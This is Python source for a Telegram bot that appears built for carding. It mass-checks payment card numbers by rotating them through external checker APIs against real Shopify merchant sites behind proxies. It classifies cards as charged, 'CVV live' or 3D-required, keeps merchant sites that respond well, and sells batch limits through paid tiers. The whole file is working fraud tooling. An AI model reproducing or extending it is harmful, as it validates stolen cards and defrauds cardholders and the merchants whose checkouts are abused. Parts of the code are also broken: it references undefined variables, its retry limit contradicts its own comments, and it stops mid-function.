# ============ SHOPIFY API POOL MANAGER ============

class ShopifyAPIPool:
    """
    Rotates between multiple Shopify APIs to distribute load
    Supports weighted round-robin and automatic failover
    MAX 5 TOTAL ATTEMPTS per card (not per API)
    GOOD sites (CARD_DECLINED/OTP_REQUIRED) are NEVER removed
    """
    
    def __init__(self, apis=None):
        if apis is None:
            apis = SHOPIFY_API_POOL
        self.apis = apis
        self.current_index = 0
        self.last_used = {}
        self.api_stats = {}
        self._lock = asyncio.Lock()
        self.session = None
        # Track cards that have already been retried
        self.retried_cards = set()
        
        # Initialize stats for each API
        for api in self.apis:
            self.api_stats[api["name"]] = {
                "total_requests": 0,
                "successful": 0,
                "failed": 0,
                "retryable": 0,
                "avg_response_time": 0,
                "last_used": 0,
                "enabled": api.get("enabled", True),
                "weight": api.get("weight", 1)
            }
        
        print(f"🔌 Shopify API Pool initialized with {len(self.apis)} APIs")
        for api in self.apis:
            print(f"   • {api['name']}: {api['url']} (weight: {api.get('weight', 1)})")
            
    
    async def get_session(self):
        """Get or create HTTP session"""
        if self.session is None:
            timeout = httpx.Timeout(60.0, connect=15.0, read=50.0)
            self.session = httpx.AsyncClient(
                timeout=timeout,
                verify=False,
                limits=httpx.Limits(max_keepalive_connections=20, max_connections=50),
                http2=True
            )
        return self.session
    
    async def get_next_api(self) -> dict:
        """
        Get next API using weighted round-robin
        Returns API configuration dict
        """
        async with self._lock:
            # Filter enabled APIs
            enabled_apis = [api for api in self.apis if api.get("enabled", True)]
            
            if not enabled_apis:
                # If all APIs are disabled, re-enable them
                print("⚠️ All APIs disabled! Re-enabling all...")
                for api in self.apis:
                    api["enabled"] = True
                enabled_apis = self.apis.copy()
            
            # Calculate total weight
            total_weight = sum(api.get("weight", 1) for api in enabled_apis)
            
            # Weighted random selection
            rand = random.uniform(0, total_weight)
            cumulative = 0
            
            for api in enabled_apis:
                cumulative += api.get("weight", 1)
                if rand <= cumulative:
                    selected = api
                    break
            else:
                selected = enabled_apis[0]
            
            # Update last used time
            self.last_used[selected["name"]] = time.time()
            
            # Get stats for debug
            stats = self.api_stats.get(selected["name"], {})
            success_rate = (stats.get('successful', 0) / max(stats.get('total_requests', 1), 1)) * 100
            
            print(f"🔄 [API POOL] Selected: {selected['name']} (weight: {selected.get('weight', 1)}, success: {success_rate:.0f}%)")
            
            return selected.copy()  # Return a copy to avoid mutation
    
    def mark_api_result(self, api_name: str, success: bool, response_time: float, is_retryable: bool = False):
        """Mark API call result for statistics and adaptive weighting"""
        for api in self.apis:
            if api["name"] == api_name:
                if success:
                    api["success_count"] = api.get("success_count", 0) + 1
                    api["last_success"] = time.time()
                    # Increase weight slightly on success (max 20)
                    api["weight"] = min(20, api.get("weight", 1) + 1)
                else:
                    api["fail_count"] = api.get("fail_count", 0) + 1
                    # Decrease weight on failure (min 0.5)
                    api["weight"] = max(0.5, api.get("weight", 1) - 0.5)
                
                # Update average response time
                old_avg = api.get("avg_response_time", 0)
                total_calls = api.get("success_count", 0) + api.get("fail_count", 0)
                if total_calls > 0:
                    api["avg_response_time"] = ((old_avg * (total_calls - 1)) + response_time) / total_calls
                
                # Auto-disable if 5 consecutive failures with no successes
                if api.get("fail_count", 0) >= 5 and api.get("success_count", 0) == 0:
                    print(f"⚠️ Disabling API {api_name} due to 5 consecutive failures")
                    api["enabled"] = False
                break
        
        # Update stats dict
        if api_name in self.api_stats:
            self.api_stats[api_name]["total_requests"] += 1
            if success:
                self.api_stats[api_name]["successful"] += 1
            else:
                if is_retryable:
                    self.api_stats[api_name]["retryable"] += 1
                else:
                    self.api_stats[api_name]["failed"] += 1
            
            old_avg = self.api_stats[api_name]["avg_response_time"]
            total = self.api_stats[api_name]["total_requests"]
            if total > 0:
                self.api_stats[api_name]["avg_response_time"] = ((old_avg * (total - 1)) + response_time) / total
    
    def _get_card_key(self, card: str, site: str) -> str:
        """Create a unique key for a card + site combination"""
        return f"{card}|{site}"
    
    async def check_card_with_pool(self, card: str, site: str, proxy: str = None, user_id: int = None) -> Dict:
        """
        Check a card using the best available API from the pool
        MAX 5 TOTAL ATTEMPTS per card
        GOOD sites (CARD_DECLINED/OTP_REQUIRED) are NEVER removed
        """
        max_attempts = 8
        tried_apis = []
        tried_sites = [site]
        
        for attempt in range(max_attempts):
            # Get a new API for each attempt
            api = await self.get_next_api()
            api_name = api["name"]
            
            # Skip if we already tried this API in this session
            if api_name in tried_apis:
                print(f"⏭️ [API POOL] Already tried {api_name}, skipping...")
                continue
            tried_apis.append(api_name)
            
            # For attempts after first, try a different site
            current_site = site
            if attempt >= 1:
                # Try a different site for retry
                if hasattr(autosopi_site_manager, 'get_next_site_weighted'):
                    new_site = autosopi_site_manager.get_next_site_weighted()
                else:
                    new_site = autosopi_site_manager.get_next_site()
                
                if new_site and new_site not in tried_sites:
                    current_site = new_site
                    tried_sites.append(new_site)
                    print(f"🔄 [RETRY #{attempt+1}] Trying different site: {current_site}")
            
            print(f"\n🔍 [API POOL] Attempt {attempt + 1}/{max_attempts} using: {api_name} (Site: {current_site})")
            
            start_time = time.time()
            
            try:
                result = await self._make_api_request(api, card, current_site, proxy, user_id)
                elapsed = time.time() - start_time
                
                if result is None:
                    print(f"❌ [API POOL] No result from {api_name}")
                    continue
                
                # Check if site was removed (from _make_api_request)
                if result.get("site_removed", False):
                    print(f"🗑️ [API POOL] Site {current_site} was removed due to error, retrying with new site")
                    # Remove from tried_sites so we can try a different one
                    if current_site in tried_sites:
                        tried_sites.remove(current_site)
                    continue
                
                response_text = result.get("message", "")
                response_upper = response_text.upper()
                status_category = result.get("status_category", "")
                
                # ============ CHECK IF SITE IS GOOD (PROTECTED) ============
                # GOOD indicators - sites that return these are NEVER removed
                good_indicators = [
                    "CARD_DECLINED", "OTP_REQUIRED", "3D REQUIRED",
                    "OTP", "3D", "CVV LIVE", "INSUFFICIENT FUNDS",
                    "ORDER_PLACED", "CHARGED", "ORDER COMPLETED"
                ]
                is_good_site = any(indicator in response_upper for indicator in good_indicators)
                
                if is_good_site:
                    # Record as GOOD site
                    try:
                        price_val = float(result.get("price", 0))
                    except (ValueError, TypeError):
                        price_val = 0
                        
                    site_quality_tracker.record_response(current_site, response_text, status_category, price_val)
                    print(f"🌟 [SITE PROTECTION] Recorded GOOD response for {current_site}")
                
                # ============ CHECK FOR SITE REMOVAL ERRORS ============
                # ONLY remove if site is NOT GOOD
                is_site_removal_error = False
                for removal_error in SITE_REMOVAL_ERRORS:
                    if removal_error.upper() in response_upper:
                        is_site_removal_error = True
                        print(f"⚠️ [API POOL] Site removal error detected: {removal_error} for site {current_site}")
                        break
                
                if is_site_removal_error:
                    # Check if site is GOOD - if yes, DON'T remove
                    if site_quality_tracker.is_good_site(current_site):
                        print(f"🌟 [SITE PROTECTION] Site {current_site} is GOOD - NOT removing despite error: {response_text[:50]}")
                    else:
                        print(f"🗑️ [SITE REMOVAL] Removing bad site: {current_site} - {response_text[:50]}")
                        autosopi_site_manager.remove_site(current_site, OWNER_ID)
                    
                    if attempt < max_attempts - 1:
                        print(f"🔄 [API POOL] Site issue, retrying with different site")
                        continue
                
                # ============ REAL CARD DECLINE PATTERNS (FINAL, NO RETRY) ============
                real_decline_patterns = [
                    "CARD_DECLINED", "DECLINED", "INSUFFICIENT FUNDS", "FRAUD_SUSPECTED","GENERIC_ERROR", 
                    "EXPIRED CARD", "DO NOT HONOR", "LOST CARD", "STOLEN CARD","GENERIC_ERROR",
                    "RESTRICTED CARD", "PAYMENTS_CREDIT_CARD_GENERIC",
                    "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT",
                    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
                    "PAYMENTS_CREDIT_CARD_NOT_SUPPORTED",
                    "PAYMENT_METHOD_NOT_ACCEPTED",
                ]
                
                is_real_decline = any(pattern in response_upper for pattern in real_decline_patterns)
                
                if is_real_decline:
                    self.mark_api_result(api_name, True, elapsed, False)
                    result["api_used"] = api_name
                    result["api_attempt"] = attempt + 1
                    result["status"] = "declined"
                    result["status_category"] = "declined"
                    result["status_display"] = "❌ DECLINED"
                    print(f"❌ [API POOL] Card DECLINED - final response")
                    return result
                
                # ============ CHECK FOR CHARGED ============
                if any(x in response_upper for x in ["CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "💎"]):
                    self.mark_api_result(api_name, True, elapsed, False)
                    result["api_used"] = api_name
                    result["api_attempt"] = attempt + 1
                    result["status_category"] = "charged"
                    result["status_display"] = "🔥 CHARGED 🔥"
                    print(f"🔥 [API POOL] CHARGED detected!")
                    return result
                
                # ============ CHECK FOR 3D/OTP ============
                if any(x in response_upper for x in ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS"]):
                    self.mark_api_result(api_name, True, elapsed, False)
                    result["api_used"] = api_name
                    result["api_attempt"] = attempt + 1
                    result["status_category"] = "approved"
                    result["status_display"] = "🔐 3D REQUIRED"
                    print(f"🔐 [API POOL] 3D REQUIRED detected!")
                    return result
                
                # ============ CHECK FOR INSUFFICIENT FUNDS ============
                if "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
                    self.mark_api_result(api_name, True, elapsed, False)
                    result["api_used"] = api_name
                    result["api_attempt"] = attempt + 1
                    result["status_category"] = "approved"
                    result["status_display"] = "💰 INSUFFICIENT FUNDS"
                    print(f"💰 [API POOL] INSUFFICIENT FUNDS detected!")
                    return result
                
                # ============ CHECK FOR CVV LIVE ============
                if "CVV LIVE" in response_upper or "INCORRECT_CVV" in response_upper:
                    self.mark_api_result(api_name, True, elapsed, False)
                    result["api_used"] = api_name
                    result["api_attempt"] = attempt + 1
                    result["status_category"] = "approved"
                    result["status_display"] = "✅ CVV LIVE"
                    print(f"✅ [API POOL] CVV LIVE detected!")
                    return result
                
                # ============ CHECK FOR RETRYABLE ERRORS ============
                retryable_patterns = [
                    "NO VALID PAYMENT METHOD FOUND", "UNKNOWN","FAILED TO GET SESSION TOKEN",
                    "DECISION_RULE_BLOCK", "Unable to get payment token: 422, message='Attempt", "Unable to get payment token: 422",
                    "CART FAILED WITH STATUS 422", "CART FAILED WITH STATUS 429","Cart failed with status 403",
                    "SITE ERROR! STATUS: 401", "SITE ERROR! STATUS: 402", "SITE ERROR! STATUS: 403",
                    "MERCHANDISE_EXPECTED_PRICE_MISMATCH","<b>No Valid Products</b>","VALIDATION_CUSTOM",
                    "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED","No Valid Products","403",
                    "INVALID_PAYMENT_METHOD", "Site not supported", "<b>No Valid Products</b>",
                    "NO VARIANTS", "GENERIC_ERROR", "No Valid Products","VALIDATION_CUSTOM",
                    "SITE DEAD", "PROXY DEAD", "CONNECTION ERROR", "TIMEOUT","Cart failed with status 403",
                    "SUBMIT REJECTED", "TOKENIZE_FAIL", "INVALID JSON RESPONSE","Cart failed with status 403",
                    "EMPTY_RESPONSE", "NO_SESSION_TOKEN", "PAYMENTS_METHOD","Cart failed",
                    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED", "PAYMENT_METHOD_NOT_ACCEPTED"
                ]
                
                is_retryable_error = any(pattern in response_upper for pattern in retryable_patterns)
                
                if is_retryable_error and attempt < max_attempts - 1:
                    print(f"🔄 [API POOL] Retryable error, will try different API/site")
                    self.mark_api_result(api_name, False, elapsed, True)
                    continue
                else:
                    # Not retryable or last attempt - treat as declined
                    self.mark_api_result(api_name, True, elapsed, False)
                    result["status"] = "declined"
                    result["status_category"] = "declined"
                    result["status_display"] = "❌ DECLINED"
                    print(f"❌ [API POOL] Card DECLINED on attempt {attempt + 1}")
                    return result
                
            except Exception as e:
                elapsed = time.time() - start_time
                self.mark_api_result(api_name, False, elapsed, True)
                print(f"❌ [API POOL] {api_name} error: {str(e)[:100]}")
                if attempt == max_attempts - 1:
                    return {
                        "status": "declined",
                        "result": "DECLINED",
                        "message": "Card declined after retries",
                        "status_display": "❌ DECLINED",
                        "status_category": "declined",
                        "elapsed": elapsed,
                        "price": "0.00",
                        "gateway": "Shopify Payments"
                    }
                continue
        
        # All retries exhausted
        print(f"❌ [API POOL] All {max_attempts} attempts failed for card {card[:20]}...")
        return {
            "status": "declined",
            "result": "DECLINED",
            "message": "Card declined",
            "status_display": "❌ DECLINED",
            "status_category": "declined",
            "elapsed": 0,
            "price": "0.00",
            "gateway": "Shopify Payments"
        }
    
    async def _make_api_request(self, api: dict, card: str, site: str, proxy: str = None, user_id: int = None) -> Dict:
        """Make request to a specific API with site quality tracking"""
        
        # Parse card
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        card_num, month, year, cvv = parts
        
        # Format year (2-digit for all bladesarksapi)
        if len(year) == 4:
            year_formatted = year[2:]
        else:
            year_formatted = year
        
        formatted_card = f"{card_num}|{month}|{year_formatted}|{cvv}"
        
        # Clean site URL
        site_clean = site.replace('http://', '').replace('https://', '')
        if site_clean.endswith('/'):
            site_clean = site_clean[:-1]
        
        session = await self.get_session()
        
        # Track if site was removed
        site_removed = False
        
        try:
            # ALL bladesarksapi endpoints use 'site' parameter
            params = {
                "site": f"https://{site_clean}",
                "cc": formatted_card
            }
            print(f"📤 [BLADESARKS API] Request to: {api['url']}")
            print(f"📤 Params: site=https://{site_clean}, cc={formatted_card[:20]}...")
            
            # Add proxy if provided
            if proxy:
                proxy_param = format_proxy_for_shopify_mass(proxy)
                if proxy_param:
                    clean_proxy = proxy_param.replace('http://', '')
                    params["proxy"] = clean_proxy
                    print(f"🔧 Using proxy: {clean_proxy[:50]}...")
            
            response = await session.get(api["url"], params=params)
            
            elapsed = response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0
            print(f"📥 Response time: {elapsed:.2f}s | Status: {response.status_code}")
            
            
            if response.status_code != 200:
                return {
                    "status": "error",
                    "result": f"HTTP_{response.status_code}",
                    "message": f"HTTP Error: {response.status_code}",
                    "status_display": f"⚠️ HTTP {response.status_code}",
                    "status_category": "retryable",
                    "elapsed": elapsed
                }
            
            # Parse JSON response
            try:
                data = response.json()
                print(f"✅ Response: {json.dumps(data, indent=2)[:500]}")
            except json.JSONDecodeError as e:
                print(f"⚠️ JSON parse error: {e}")
                # Check if response is HTML (site error page)
                if response.text and ('<html' in response.text[:100] or '<!DOCTYPE' in response.text[:100]):
                    if site_quality_tracker.is_good_site(site_clean):
                        print(f"🌟 [SITE PROTECTION] Site {site_clean} is GOOD - NOT removing despite HTML error")
                    else:
                        print(f"🗑️ HTML response (site error) - Removing site: {site_clean}")
                        autosopi_site_manager.remove_site(site_clean, OWNER_ID)
                        site_removed = True
                    return {
                        "status": "error",
                        "result": "HTML_ERROR",
                        "message": "Site returned HTML error page",
                        "status_display": "⚠️ SITE REMOVED",
                        "status_category": "retryable",
                        "elapsed": elapsed,
                        "site_removed": True
                    }
                return {
                    "status": "error",
                    "result": "JSON_ERROR",
                    "message": "Invalid JSON response",
                    "status_display": "⚠️ JSON ERROR",
                    "status_category": "retryable",
                    "elapsed": elapsed
                }
            
            # Extract response data
            response_text = data.get("Response", data.get("response", data.get("message", data.get("status", "UNKNOWN"))))
            gateway = data.get("Gateway", data.get("gateway", data.get("Gate", "Shopify Payments")))
            price = data.get("Price", data.get("price", data.get("amount", "0.00")))
            api_status = data.get("Status", data.get("success", False))
            
            response_upper = response_text.upper()
            
            # ============ RECORD GOOD SITE RESPONSES ============
            good_indicators = [
                "CARD_DECLINED", "OTP_REQUIRED", "3D REQUIRED",
                "OTP", "3D", "CVV LIVE", "INSUFFICIENT FUNDS",
                "ORDER_PLACED", "CHARGED", "ORDER COMPLETED"
            ]
            is_good_response = any(indicator in response_upper for indicator in good_indicators)
            
            if is_good_response:
                try:
                    price_float = float(price)
                except (ValueError, TypeError):
                    price_float = 0.00
            
            # ============ CHECK FOR SITE REMOVAL ERRORS ============
            # ONLY remove if site is NOT GOOD
            for removal_error in SITE_REMOVAL_ERRORS:
                if removal_error.upper() in response_upper:
                    # Check if site is GOOD - if yes, DON'T remove
                    if site_quality_tracker.is_good_site(site_clean):
                        print(f"🌟 [SITE PROTECTION] Site {site_clean} is GOOD - NOT removing despite error: {removal_error}")
                    else:
                        print(f"🗑️ [SITE REMOVAL] {removal_error} detected for site {site_clean}")
                        autosopi_site_manager.remove_site(site_clean, OWNER_ID)
                        site_removed = True
                    return {
                        "status": "error",
                        "result": removal_error,
                        "message": response_text,
                        "status_display": f"⚠️ SITE REMOVED: {removal_error}",
                        "status_category": "retryable",
                        "elapsed": elapsed,
                        "price": str(price),
                        "gateway": gateway,
                        "site_removed": True,
                        "site": site_clean
                    }
            
            # ============ CARD DECLINE PATTERNS (NOT site issues) ============
            real_decline_patterns = [
                "CARD_DECLINED", "DECLINED", "INSUFFICIENT FUNDS", 
                "EXPIRED CARD", "DO NOT HONOR", "LOST CARD", "STOLEN CARD",
                "RESTRICTED CARD", "PAYMENTS_CREDIT_CARD_GENERIC",
                "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT",
                "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
                "PAYMENTS_CREDIT_CARD_NOT_SUPPORTED",
            ]
            
            is_real_decline = any(pattern in response_upper for pattern in real_decline_patterns)
            
            try:
                price_float = float(price)
            except (ValueError, TypeError):
                price_float = 0.00
            
            if is_real_decline:
                print(f"❌ [API] Card DECLINED - real decline")
                site_quality_tracker.record_response(site_clean, response_text, "declined", price_float)
                return {
                    "status": "declined",
                    "result": response_text,
                    "message": response_text,
                    "status_display": "❌ DECLINED",
                    "status_category": "declined",
                    "elapsed": elapsed,
                    "price": str(price),
                    "gateway": gateway,
                    "site": site_clean,
                    "proxy_used": proxy,
                    "api_name": api["name"]
                }
            
            # ============ CHECK FOR CHARGED ============
            if any(x in response_upper for x in ["CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "💎"]):
                print(f"🔥 [API] CHARGED detected!")
                return {
                    "status": "success",
                    "result": response_text,
                    "message": response_text,
                    "status_display": "🔥 CHARGED 🔥",
                    "status_category": "charged",
                    "elapsed": elapsed,
                    "price": str(price),
                    "gateway": gateway,
                    "site": site_clean,
                    "proxy_used": proxy,
                    "api_name": api["name"]
                }
            
            # ============ CHECK FOR 3D/OTP ============
            if any(x in response_upper for x in ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS"]):
                print(f"🔐 [API] 3D REQUIRED detected!")
                return {
                    "status": "success",
                    "result": response_text,
                    "message": response_text,
                    "status_display": "🔐 3D REQUIRED",
                    "status_category": "approved",
                    "elapsed": elapsed,
                    "price": str(price),
                    "gateway": gateway,
                    "site": site_clean,
                    "proxy_used": proxy,
                    "api_name": api["name"]
                }
            
            # ============ CHECK FOR INSUFFICIENT FUNDS ============
            if "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
                print(f"💰 [API] INSUFFICIENT FUNDS detected!")
                return {
                    "status": "success",
                    "result": response_text,
                    "message": response_text,
                    "status_display": "💰 INSUFFICIENT FUNDS",
                    "status_category": "approved",
                    "elapsed": elapsed,
                    "price": str(price),
                    "gateway": gateway,
                    "site": site_clean,
                    "proxy_used": proxy,
                    "api_name": api["name"]
                }
            
            # ============ CHECK FOR CVV LIVE ============
            if "CVV LIVE" in response_upper or "INCORRECT_CVV" in response_upper:
                print(f"✅ [API] CVV LIVE detected!")
                return {
                    "status": "success",
                    "result": response_text,
                    "message": response_text,
                    "status_display": "✅ CVV LIVE",
                    "status_category": "approved",
                    "elapsed": elapsed,
                    "price": str(price),
                    "gateway": gateway,
                    "site": site_clean,
                    "proxy_used": proxy,
                    "api_name": api["name"]
                }
            
            # ============ RETRYABLE ERRORS (try different site/api) ============
            retryable_patterns = [
                "NO VALID PAYMENT METHOD FOUND", "FAILED TO GET SESSION TOKEN",
                "DECISION_RULE_BLOCK",
                "CART FAILED WITH STATUS 422", "CART FAILED WITH STATUS 429",
                "SITE ERROR! STATUS: 401", "SITE ERROR! STATUS: 402", "SITE ERROR! STATUS: 403",
                "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
                "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
                "INVALID_PAYMENT_METHOD", "Site not supported",
                "NO VARIANTS", "Not Shopify!", "No Valid Products",
                "SITE DEAD", "PROXY DEAD", "CONNECTION ERROR", "TIMEOUT",
                "SUBMIT REJECTED", "TOKENIZE_FAIL", "INVALID JSON RESPONSE",
                "EMPTY_RESPONSE", "NO_SESSION_TOKEN", "PAYMENTS_METHOD",
                 "PAYMENT_METHOD_NOT_ACCEPTED",
                "SITE ERROR! STATUS: 429", "Cart failed with status"
            ]
            
            is_retryable = any(pattern in response_upper for pattern in retryable_patterns)
            
            if is_retryable:
                print(f"🔄 [API] Retryable error: {response_text[:100]}")
                return {
                    "status": "error",
                    "result": response_text,
                    "message": response_text,
                    "status_display": "⚠️ RETRYABLE",
                    "status_category": "retryable",
                    "elapsed": elapsed,
                    "price": str(price),
                    "gateway": gateway,
                    "site": site_clean,
                    "proxy_used": proxy,
                    "api_name": api["name"]
                }
            
            # Default: treat as declined
            print(f"❌ [API] Unknown response - treating as DECLINED")
            return {
                "status": "declined",
                "result": response_text,
                "message": response_text,
                "status_display": "❌ DECLINED",
                "status_category": "declined",
                "elapsed": elapsed,
                "price": str(price),
                "gateway": gateway,
                "site": site_clean,
                "proxy_used": proxy,
                "api_name": api["name"]
            }
                
        except httpx.TimeoutException:
            print(f"⏰ Request timeout for site {site_clean}")
            return {
                "status": "error",
                "result": "TIMEOUT",
                "message": "Request timeout",
                "status_display": "⚠️ TIMEOUT",
                "status_category": "retryable",
                "elapsed": 0
            }
        except Exception as e:
            print(f"❌ API request error: {e}")
            return {
                "status": "error",
                "result": "REQUEST_ERROR",
                "message": str(e)[:100],
                "status_display": "⚠️ REQUEST ERROR",
                "status_category": "retryable",
                "elapsed": 0
            }
    
    def get_stats(self) -> str:
        """Get formatted statistics for all APIs"""
        result = "📊 <b>Shopify API Pool Statistics</b>\n\n"
        
        for api in self.apis:
            name = api["name"]
            stats = self.api_stats.get(name, {})
            enabled = "✅" if api.get("enabled", True) else "❌"
            total = stats.get('total_requests', 0)
            successful = stats.get('successful', 0)
            retryable = stats.get('retryable', 0)
            failed = stats.get('failed', 0)
            success_rate = (successful / max(total, 1)) * 100
            
            result += f"{enabled} <b>{name}</b>\n"
            result += f"   ├─ Requests: {total}\n"
            result += f"   ├─ Success Rate: {success_rate:.1f}%\n"
            result += f"   ├─ Successful: {successful}\n"
            result += f"   ├─ Retryable Errors: {retryable}\n"
            result += f"   ├─ Failed: {failed}\n"
            result += f"   ├─ Avg Time: {stats.get('avg_response_time', 0):.2f}s\n"
            result += f"   └─ Weight: {api.get('weight', 1):.1f}\n\n"
        
        return result
    
    async def close(self):
        """Close HTTP session"""
        if self.session:
            await self.session.aclose()
            self.session = None
    


# Create global instance
shopify_api_pool = ShopifyAPIPool()



@check_gateway("aumc")
async def aumc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Wrapper for /aumc command - extracts cards and calls mass check logic"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    # Check if user already has an active session
    if user_id in autosopi_active_tasks:
        await message.reply_text(
            "⚠️ You already have an active Autosopi session.\n"
            "Please wait for it to finish or use /stop to cancel.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if too many users are active
    if len(autosopi_active_tasks) >= MAX_CONCURRENT_USERS:
        await message.reply_text(
            "⚠️ <b>Bot is very busy right now</b>\n\n"
            f"Current active users: {len(autosopi_active_tasks)}\n"
            "Please try again in a few seconds.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if this is a reply to a file
    if update.message.reply_to_message:
        user_id_reply = update.effective_user.id
        reply_to_msg_id = update.message.reply_to_message.message_id
        
        if user_id_reply in pending_files and pending_files[user_id_reply].get('message_id') == reply_to_msg_id:
            file_data = pending_files.pop(user_id_reply)
            cards = file_data['cards']
            
            if not user_manager.can_access_gateway(user_id, 'autosopi'):
                await message.reply_text("❌ Your tier doesn't have access to Autosopi gateway.")
                return
            
            await autosopi_mass_check_logic(update, context, cards)
            return
        
    if not user_manager.can_access_gateway(user_id, 'stripe_auth'):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f" USE /buy TO UPGRADE YOUR TIER 💎\n"
            
        )
        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
        add_user_credits(u_id, 1)
        return
    
    if not context.args:
        await message.reply_text(
            "📦 <b>New Autosopi Mass Check</b>\n\n"
            "Usage: <code>/aumc &lt;card1&gt; &lt;card2&gt; ...</code>\n\n"
            "Examples:\n"
            "<code>/aumc 4111111111111111|12|25|123 4222222222222222|11|24|456</code>\n\n"
            "Or reply to a .txt file with /aumc",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not user_manager.can_access_gateway(user_id, 'autosopi'):
        await message.reply_text("❌ Your tier doesn't have access to Autosopi gateway.")
        return
    
    # Extract cards from text
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str[:30])
    
    if invalid_cards:
        await message.reply_text(
            f"⚠️ Found {len(invalid_cards)} invalid card(s). They will be skipped.\n"
            f"First invalid: {invalid_cards[0]}..."
        )
    
    if not cards:
        await message.reply_text("❌ No valid cards found.")
        return
    
    # Check batch size limit
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        await message.reply_text(f" USE /buy TO UPGRADE")
        cards = cards[:max_batch]
    
    # Start mass check
    await autosopi_mass_check_logic(update, context, cards)
    
    
# ============ API POOL TEST COMMAND ============

async def test_api_pool_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test all Shopify APIs in the pool - /api"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    # Only owner can run this command (or you can allow all users)
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command. Contact @lencax")
        return
    
    status_msg = await update.message.reply_text(
        "🧪 <b>Testing Shopify API Pool...</b>\n\n"
        "Checking all APIs, please wait...",
        parse_mode=ParseMode.HTML
    )
    
    # Test card (will be declined - valid format)
    test_card = "4111111111111111|12|2028|123"
    test_site = "anseladams.org"  # Working test site
    
    results = []
    working_apis = []
    failed_apis = []
    
    for api in shopify_api_pool.apis:
        api_name = api["name"]
        api_url = api["url"]
        api_enabled = api.get("enabled", True)
        
        print(f"\n🔍 Testing API: {api_name}")
        
        await status_msg.edit_text(
            f"🧪 <b>Testing Shopify API Pool...</b>\n\n"
            f"Testing: {api_name}\n"
            f"Status: {'Enabled' if api_enabled else 'Disabled'}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"⏱️ Please wait...",
            parse_mode=ParseMode.HTML
        )
        
        start_time = time.time()
        
        try:
            # Format request based on API type
            session = await shopify_api_pool.get_session()
            
            if api.get("params_format") == "query":
                params = {
                    "site": f"https://{test_site}",
                    "cc": test_card
                }
                response = await session.get(api_url, params=params, timeout=30)
            else:
                params = {
                    "site": f"https://{test_site}",
                    "cc": test_card
                }
                response = await session.get(api_url, params=params, timeout=30)
            
            elapsed = time.time() - start_time
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    response_text = data.get("Response", data.get("message", "UNKNOWN"))
                    
                    # Check if response indicates API is working
                    # Valid responses: CARD_DECLINED, OTP_REQUIRED, INSUFFICIENT_FUNDS, etc.
                    valid_responses = [
                        "CARD_DECLINED", "DECLINED", "OTP_REQUIRED", "3D",
                        "INSUFFICIENT_FUNDS", "CVV LIVE", "ORDER_PLACED",
                        "CHARGED", "PAYMENTS_CREDIT_CARD_BASE_EXPIRED"
                    ]
                    
                    is_working = any(vr in response_text.upper() for vr in valid_responses)
                    
                    if is_working:
                        working_apis.append({
                            "name": api_name,
                            "url": api_url,
                            "time": elapsed,
                            "response": response_text[:80]
                        })
                        results.append(f"✅ {api_name} - WORKING ({elapsed:.2f}s)\n   Response: {response_text[:60]}")
                        print(f"✅ {api_name} - WORKING ({elapsed:.2f}s)")
                    else:
                        failed_apis.append({
                            "name": api_name,
                            "url": api_url,
                            "error": response_text[:80],
                            "status_code": response.status_code
                        })
                        results.append(f"❌ {api_name} - FAILED\n   Response: {response_text[:60]}")
                        print(f"❌ {api_name} - FAILED: {response_text[:50]}")
                        
                except json.JSONDecodeError:
                    failed_apis.append({
                        "name": api_name,
                        "url": api_url,
                        "error": "Invalid JSON response",
                        "status_code": response.status_code
                    })
                    results.append(f"❌ {api_name} - INVALID JSON")
                    print(f"❌ {api_name} - Invalid JSON")
                    
            elif response.status_code == 404:
                failed_apis.append({
                    "name": api_name,
                    "url": api_url,
                    "error": "HTTP 404 Not Found",
                    "status_code": 404
                })
                results.append(f"❌ {api_name} - HTTP 404 (Not Found)")
                print(f"❌ {api_name} - HTTP 404")
                
            elif response.status_code == 403:
                failed_apis.append({
                    "name": api_name,
                    "url": api_url,
                    "error": "HTTP 403 Forbidden",
                    "status_code": 403
                })
                results.append(f"❌ {api_name} - HTTP 403 (Forbidden)")
                print(f"❌ {api_name} - HTTP 403")
                
            elif response.status_code == 500:
                failed_apis.append({
                    "name": api_name,
                    "url": api_url,
                    "error": "HTTP 500 Internal Server Error",
                    "status_code": 500
                })
                results.append(f"❌ {api_name} - HTTP 500 (Server Error)")
                print(f"❌ {api_name} - HTTP 500")
                
            else:
                failed_apis.append({
                    "name": api_name,
                    "url": api_url,
                    "error": f"HTTP {response.status_code}",
                    "status_code": response.status_code
                })
                results.append(f"❌ {api_name} - HTTP {response.status_code}")
